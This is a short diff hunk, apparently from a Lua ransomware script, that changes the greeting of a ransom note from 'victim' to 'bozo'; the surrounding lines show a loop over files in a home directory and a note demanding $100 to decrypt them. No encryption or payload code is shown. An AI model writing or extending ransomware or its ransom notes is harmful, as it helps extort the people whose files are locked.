@@ -58,7 +58,7 @@ for file in fs.list(home_path) do
 end
 
 local ransom_note = [[
-Hello, victim. Your files have been encrypted!
+Hello, bozo. Your files have been encrypted!
 
 To decrypt your files, you must pay a ransom of $100.
 
